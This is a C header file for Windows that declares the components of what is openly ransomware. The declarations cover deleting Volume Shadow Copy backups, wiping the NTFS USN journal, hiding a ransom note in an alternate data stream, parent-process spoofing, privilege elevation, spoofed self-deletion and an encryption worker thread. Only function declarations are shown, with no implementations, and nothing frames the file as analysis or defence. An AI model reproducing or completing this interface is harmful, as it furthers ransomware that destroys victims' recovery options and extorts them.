/* utils.h - Simplified utility interface */
#ifndef UTILS_H
#define UTILS_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Stub - no longer needed */
void InitAllSyscalls(void);

/* PPID Spoofing */
DWORD FindProcessPidStr(const char* procName);

/* VSS deletion */
void NukeBackupsCOM(void);
void NukeBackups(void);

/* USN Journal wipe */
void WipeUSNJournal(void);

/* ADS ransom note */
void DropNoteADS(void);

/* IO priority */
void SetIoCrtitical(void);

/* Self-delete */
void SelfDeleteSpoofed(void);

/* Original functions */
void ElevatePrivileges(void);
void DropNote(void);
void SelfDelete(void);
unsigned __stdcall EncryptionWorker(void* arg);

#ifdef __cplusplus
}
#endif

#endif /* UTILS_H */
